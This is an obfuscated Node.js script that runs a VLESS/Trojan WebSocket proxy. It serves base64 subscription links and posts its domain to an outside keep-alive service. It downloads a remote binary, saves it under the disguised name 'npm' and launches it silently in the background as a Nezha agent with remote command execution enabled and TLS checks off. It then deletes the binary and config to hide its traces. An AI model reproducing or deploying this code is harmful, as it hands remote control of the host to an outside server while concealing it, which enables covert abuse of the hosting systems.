const _0x42d6=['1.1.1.1','Server\x20is\x20running\x20on\x20port\x20','AUTO_ACCESS','join','2096','443','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','connection','https://amd64.ssss.nyc.mn/v1','npm\x20is\x20already\x20running,\x20skip\x20running...','post','Answer','text/plain','then','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','error','http','NEZHA_PORT','write','Automatic\x20Access\x20Task\x20added\x20successfully','url','slice','Not\x20Found\x0a','base64','npm','--tls','decode','isp','includes','map','data','WSPATH','get','https://','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','split','readUInt8','catch','concat','&path=%2F','message','env','text/html','npm\x20download\x20successfully','writeHead','reduce','net','readUInt16BE','aarch64','https://arm64.ssss.nyc.mn/v1','sha224','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','DOMAIN','substr','8443','log','digest','pipe','setsid\x20nohup\x20./npm\x20-s\x20','replace','true','unlink','createServer','from','connect','arch','https://arm64.ssss.nyc.mn/agent','readFile','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','trim','utf8','2087','toString','arm64','child_process','every','application/json','JuniorBrother','length','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','application/dns-json','trojan://'];const _0x50dc=function(_0x42d626,_0x50dc83){_0x42d626=_0x42d626-0x0;let _0x6ff1c9=_0x42d6[_0x42d626];return _0x6ff1c9;};const os=require('os');const http=require(_0x50dc('0x10'));const fs=require('fs');const axios=require('axios');const net=require(_0x50dc('0x2e'));const path=require('path');const crypto=require('crypto');const {Buffer}=require('buffer');const {exec,execSync}=require(_0x50dc('0x4a'));const {WebSocket,createWebSocketStream}=require('ws');const UUID=process['env']['UUID']||'fe170d28-62b3-413e-9412-671e8c5f911e';const NEZHA_SERVER=process[_0x50dc('0x29')]['NEZHA_SERVER']||'';const NEZHA_PORT=process[_0x50dc('0x29')][_0x50dc('0x11')]||'';const NEZHA_KEY=process['env']['NEZHA_KEY']||'';const DOMAIN=process[_0x50dc('0x29')][_0x50dc('0x34')]||'1234.abc.com';const AUTO_ACCESS=process[_0x50dc('0x29')][_0x50dc('0x2')]||!![];const WSPATH=process['env'][_0x50dc('0x1f')]||UUID['slice'](0x0,0x8);const SUB_PATH=process[_0x50dc('0x29')]['SUB_PATH']||_0x50dc('0x4d');const NAME=process['env']['NAME']||'';const PORT=process['env']['PORT']||0x1eb4;let ISP='';const GetISP=async()=>{try{const _0x806507=await axios['get']('https://api.ip.sb/geoip');const _0xd18d6=_0x806507[_0x50dc('0x1e')];ISP=(_0xd18d6['country_code']+'-'+_0xd18d6[_0x50dc('0x1b')])[_0x50dc('0x3b')](/ /g,'_');}catch(_0x52cb18){ISP='Unknown';}};GetISP();const httpServer=http[_0x50dc('0x3e')]((_0x50a65f,_0x226464)=>{if(_0x50a65f[_0x50dc('0x14')]==='/'){const _0x373e04=path['join'](__dirname,'index.html');fs[_0x50dc('0x43')](_0x373e04,_0x50dc('0x46'),(_0x4de715,_0x9d476f)=>{if(_0x4de715){_0x226464[_0x50dc('0x2c')](0xc8,{'Content-Type':_0x50dc('0x2a')});_0x226464['end']('Hello\x20world!');return;}_0x226464['writeHead'](0xc8,{'Content-Type':'text/html'});_0x226464['end'](_0x9d476f);});return;}else if(_0x50a65f['url']==='/'+SUB_PATH){const _0x4457e7=NAME?NAME+'-'+ISP:ISP;const _0x4f1d68='vless://'+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x50dc('0x27')+WSPATH+'#'+_0x4457e7;const _0x18aa75=_0x50dc('0x51')+UUID+'@'+DOMAIN+':443?security=tls&sni='+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x4457e7;const _0x6e90d0=_0x4f1d68+'\x0a'+_0x18aa75;const _0x44c31=Buffer[_0x50dc('0x3f')](_0x6e90d0)['toString'](_0x50dc('0x17'));_0x226464[_0x50dc('0x2c')](0xc8,{'Content-Type':_0x50dc('0xc')});_0x226464['end'](_0x44c31+'\x0a');}else{_0x226464['writeHead'](0x194,{'Content-Type':_0x50dc('0xc')});_0x226464['end'](_0x50dc('0x16'));}});const wss=new WebSocket['Server']({'server':httpServer});const uuid=UUID[_0x50dc('0x3b')](/-/g,'');const DNS_SERVERS=['8.8.4.4',_0x50dc('0x0')];function resolveHost(_0xca20f0){return new Promise((_0x1d4eb6,_0x4a321e)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0xca20f0)){_0x1d4eb6(_0xca20f0);return;}let _0x557619=0x0;function _0x2fb130(){if(_0x557619>=DNS_SERVERS['length']){_0x4a321e(new Error('Failed\x20to\x20resolve\x20'+_0xca20f0+'\x20with\x20all\x20DNS\x20servers'));return;}const _0xf34678=DNS_SERVERS[_0x557619];_0x557619++;const _0xc7db1f='https://dns.google/resolve?name='+encodeURIComponent(_0xca20f0)+'&type=A';axios[_0x50dc('0x20')](_0xc7db1f,{'timeout':0x1388,'headers':{'Accept':_0x50dc('0x50')}})[_0x50dc('0xd')](_0x3eca56=>{const _0x4547be=_0x3eca56[_0x50dc('0x1e')];if(_0x4547be['Status']===0x0&&_0x4547be['Answer']&&_0x4547be['Answer']['length']>0x0){const _0x4df962=_0x4547be[_0x50dc('0xb')]['find'](_0x4a0ad5=>_0x4a0ad5['type']===0x1);if(_0x4df962){_0x1d4eb6(_0x4df962[_0x50dc('0x1e')]);return;}}_0x2fb130();})[_0x50dc('0x25')](_0x3dc8ee=>{_0x2fb130();});}_0x2fb130();});}function handleVlessConnection(_0x26660b,_0x5424b5){const [_0x4dde20]=_0x5424b5;const _0x515f79=_0x5424b5['slice'](0x1,0x11);if(!_0x515f79['every']((_0x1e8c21,_0x5c5ed7)=>_0x1e8c21==parseInt(uuid[_0x50dc('0x35')](_0x5c5ed7*0x2,0x2),0x10)))return![];let _0x435c0a=_0x5424b5['slice'](0x11,0x12)['readUInt8']()+0x13;const _0x39510=_0x5424b5[_0x50dc('0x15')](_0x435c0a,_0x435c0a+=0x2)['readUInt16BE'](0x0);const _0x4b6d81=_0x5424b5[_0x50dc('0x15')](_0x435c0a,_0x435c0a+=0x1)[_0x50dc('0x24')]();const _0x2dfe41=_0x4b6d81==0x1?_0x5424b5[_0x50dc('0x15')](_0x435c0a,_0x435c0a+=0x4)['join']('.'):_0x4b6d81==0x2?new TextDecoder()[_0x50dc('0x1a')](_0x5424b5['slice'](_0x435c0a+0x1,_0x435c0a+=0x1+_0x5424b5[_0x50dc('0x15')](_0x435c0a,_0x435c0a+0x1)[_0x50dc('0x24')]())):_0x4b6d81==0x3?_0x5424b5[_0x50dc('0x15')](_0x435c0a,_0x435c0a+=0x10)['reduce']((_0x36602c,_0x24fd41,_0x397873,_0x388126)=>_0x397873%0x2?_0x36602c[_0x50dc('0x26')](_0x388126['slice'](_0x397873-0x1,_0x397873+0x1)):_0x36602c,[])[_0x50dc('0x1d')](_0x115534=>_0x115534[_0x50dc('0x2f')](0x0)['toString'](0x10))[_0x50dc('0x3')](':'):'';_0x26660b['send'](new Uint8Array([_0x4dde20,0x0]));const _0x17c0f7=createWebSocketStream(_0x26660b);resolveHost(_0x2dfe41)['then'](_0x10ba37=>{net['connect']({'host':_0x10ba37,'port':_0x39510},function(){this[_0x50dc('0x12')](_0x5424b5['slice'](_0x435c0a));_0x17c0f7['on']('error',()=>{})['pipe'](this)['on']('error',()=>{})['pipe'](_0x17c0f7);})['on'](_0x50dc('0xf'),()=>{});})[_0x50dc('0x25')](_0x2aa258=>{net[_0x50dc('0x40')]({'host':_0x2dfe41,'port':_0x39510},function(){this['write'](_0x5424b5[_0x50dc('0x15')](_0x435c0a));_0x17c0f7['on']('error',()=>{})['pipe'](this)['on'](_0x50dc('0xf'),()=>{})[_0x50dc('0x39')](_0x17c0f7);})['on']('error',()=>{});});return!![];}function handleTrojanConnection(_0x360e77,_0xe43f7a){try{if(_0xe43f7a[_0x50dc('0x4e')]<0x3a)return![];const _0x18b7e5=_0xe43f7a['slice'](0x0,0x38)[_0x50dc('0x48')]();const _0x366439=[UUID];let _0x49b151=null;for(const _0x3e172e of _0x366439){const _0x5c69f3=crypto['createHash'](_0x50dc('0x32'))['update'](_0x3e172e)[_0x50dc('0x38')]('hex');if(_0x5c69f3===_0x18b7e5){_0x49b151=_0x3e172e;break;}}if(!_0x49b151)return![];let _0x1f379e=0x38;if(_0xe43f7a[_0x1f379e]===0xd&&_0xe43f7a[_0x1f379e+0x1]===0xa){_0x1f379e+=0x2;}const _0x4ae16f=_0xe43f7a[_0x1f379e];if(_0x4ae16f!==0x1)return![];_0x1f379e+=0x1;const _0xcf1558=_0xe43f7a[_0x1f379e];_0x1f379e+=0x1;let _0x46f02c,_0x391802;if(_0xcf1558===0x1){_0x46f02c=_0xe43f7a[_0x50dc('0x15')](_0x1f379e,_0x1f379e+0x4)['join']('.');_0x1f379e+=0x4;}else if(_0xcf1558===0x3){const _0x301bce=_0xe43f7a[_0x1f379e];_0x1f379e+=0x1;_0x46f02c=_0xe43f7a['slice'](_0x1f379e,_0x1f379e+_0x301bce)[_0x50dc('0x48')]();_0x1f379e+=_0x301bce;}else if(_0xcf1558===0x4){_0x46f02c=_0xe43f7a['slice'](_0x1f379e,_0x1f379e+0x10)[_0x50dc('0x2d')]((_0x31ad7d,_0x2a5a07,_0x456fad,_0xf9390a)=>_0x456fad%0x2?_0x31ad7d[_0x50dc('0x26')](_0xf9390a[_0x50dc('0x15')](_0x456fad-0x1,_0x456fad+0x1)):_0x31ad7d,[])['map'](_0x3e4392=>_0x3e4392[_0x50dc('0x2f')](0x0)[_0x50dc('0x48')](0x10))[_0x50dc('0x3')](':');_0x1f379e+=0x10;}else{return![];}_0x391802=_0xe43f7a[_0x50dc('0x2f')](_0x1f379e);_0x1f379e+=0x2;if(_0x1f379e<_0xe43f7a['length']&&_0xe43f7a[_0x1f379e]===0xd&&_0xe43f7a[_0x1f379e+0x1]===0xa){_0x1f379e+=0x2;}const _0x26e308=createWebSocketStream(_0x360e77);resolveHost(_0x46f02c)['then'](_0x22ebdb=>{net['connect']({'host':_0x22ebdb,'port':_0x391802},function(){if(_0x1f379e<_0xe43f7a['length']){this[_0x50dc('0x12')](_0xe43f7a['slice'](_0x1f379e));}_0x26e308['on']('error',()=>{})[_0x50dc('0x39')](this)['on']('error',()=>{})['pipe'](_0x26e308);})['on'](_0x50dc('0xf'),()=>{});})[_0x50dc('0x25')](_0x41f654=>{net['connect']({'host':_0x46f02c,'port':_0x391802},function(){if(_0x1f379e<_0xe43f7a['length']){this[_0x50dc('0x12')](_0xe43f7a[_0x50dc('0x15')](_0x1f379e));}_0x26e308['on']('error',()=>{})[_0x50dc('0x39')](this)['on']('error',()=>{})[_0x50dc('0x39')](_0x26e308);})['on'](_0x50dc('0xf'),()=>{});});return!![];}catch(_0x4d7f5b){return![];}}wss['on'](_0x50dc('0x7'),(_0xce8be5,_0x5006a3)=>{const _0x1c9587=_0x5006a3['url']||'';_0xce8be5['once'](_0x50dc('0x28'),_0x38b916=>{if(_0x38b916['length']>0x11&&_0x38b916[0x0]===0x0){const _0x403aed=_0x38b916['slice'](0x1,0x11);const _0x3033a2=_0x403aed[_0x50dc('0x4b')]((_0x52bfd9,_0x4b0d68)=>_0x52bfd9==parseInt(uuid[_0x50dc('0x35')](_0x4b0d68*0x2,0x2),0x10));if(_0x3033a2){if(!handleVlessConnection(_0xce8be5,_0x38b916)){_0xce8be5['close']();}return;}}if(!handleTrojanConnection(_0xce8be5,_0x38b916)){_0xce8be5['close']();}})['on'](_0x50dc('0xf'),()=>{});});const getDownloadUrl=()=>{const _0xb6bba4=os[_0x50dc('0x41')]();if(_0xb6bba4==='arm'||_0xb6bba4===_0x50dc('0x49')||_0xb6bba4===_0x50dc('0x30')){if(!NEZHA_PORT){return _0x50dc('0x31');}else{return _0x50dc('0x42');}}else{if(!NEZHA_PORT){return _0x50dc('0x8');}else{return'https://amd64.ssss.nyc.mn/agent';}}};const downloadFile=async()=>{if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x2dbdb0=getDownloadUrl();const _0x3b7fe8=await axios({'method':_0x50dc('0x20'),'url':_0x2dbdb0,'responseType':'stream'});const _0x29d885=fs['createWriteStream']('npm');_0x3b7fe8['data']['pipe'](_0x29d885);return new Promise((_0x32bf53,_0x5a0ee6)=>{_0x29d885['on']('finish',()=>{console['log'](_0x50dc('0x2b'));exec('chmod\x20+x\x20npm',_0x666265=>{if(_0x666265)_0x5a0ee6(_0x666265);_0x32bf53();});});_0x29d885['on'](_0x50dc('0xf'),_0x5a0ee6);});}catch(_0xd185dd){throw _0xd185dd;}};const runnz=async()=>{try{const _0x30a874=execSync(_0x50dc('0x44'),{'encoding':'utf-8'});if(_0x30a874[_0x50dc('0x45')]()!==''){console['log'](_0x50dc('0x9'));return;}}catch(_0x552a9e){}await downloadFile();let _0x4a5466='';let _0x4e85be=[_0x50dc('0x5'),_0x50dc('0x36'),_0x50dc('0x4'),_0x50dc('0x47'),'2083','2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x43487e=_0x4e85be['includes'](NEZHA_PORT)?_0x50dc('0x19'):'';_0x4a5466=_0x50dc('0x3a')+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x43487e+_0x50dc('0x33');}else if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x11427c=NEZHA_SERVER[_0x50dc('0x1c')](':')?NEZHA_SERVER[_0x50dc('0x23')](':')['pop']():'';const _0x374d48=_0x4e85be[_0x50dc('0x1c')](_0x11427c)?_0x50dc('0x3c'):'false';const _0x16076a='client_secret:\x20'+NEZHA_KEY+_0x50dc('0xe')+NEZHA_SERVER+_0x50dc('0x6')+_0x374d48+_0x50dc('0x22')+UUID;fs['writeFileSync']('config.yaml',_0x16076a);}_0x4a5466=_0x50dc('0x4f');}else{console['log']('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}try{exec(_0x4a5466,{'shell':'/bin/bash'},_0x978e09=>{if(_0x978e09)console[_0x50dc('0xf')]('npm\x20running\x20error:',_0x978e09);else console['log']('npm\x20is\x20running');});}catch(_0x334b45){console['error']('error:\x20'+_0x334b45);}};async function addAccessTask(){if(!AUTO_ACCESS)return;if(!DOMAIN){return;}const _0x154a01=_0x50dc('0x21')+DOMAIN;try{const _0x5ffd96=await axios[_0x50dc('0xa')]('https://oooo.serv00.net/add-url',{'url':_0x154a01},{'headers':{'Content-Type':_0x50dc('0x4c')}});console['log'](_0x50dc('0x13'));}catch(_0x55e695){}}const delFiles=()=>{fs['unlink'](_0x50dc('0x18'),()=>{});fs[_0x50dc('0x3d')]('config.yaml',()=>{});};httpServer['listen'](PORT,()=>{runnz();setTimeout(()=>{delFiles();},0x2bf20);addAccessTask();console[_0x50dc('0x37')](_0x50dc('0x1')+PORT);});
